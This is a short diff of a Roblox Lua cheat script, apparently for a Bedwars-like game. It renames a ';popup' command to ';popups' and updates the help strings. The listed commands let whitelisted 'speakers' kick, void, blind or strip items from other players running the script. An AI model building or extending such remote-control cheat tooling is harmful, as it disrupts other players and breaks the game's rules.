@@ -5,7 +5,7 @@ local Notify = function(_Title, _Text , Time)
 end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
-local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple⭐"
+local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -102,7 +102,7 @@ elseif cmd == ";listore" and getsexter(speaker) and game.Players.LocalPlayer.Nam
 
 
 
-elseif cmd == ";popup" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+elseif cmd == ";popups" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 local popup = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -213,7 +213,7 @@ local function WIPP_fake_script() -- X.LocalScript
 	end)
 end
 coroutine.wrap(WIPP_fake_script)()
-elseif cmd == ";popup" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+elseif cmd == ";popups" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 local popup = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
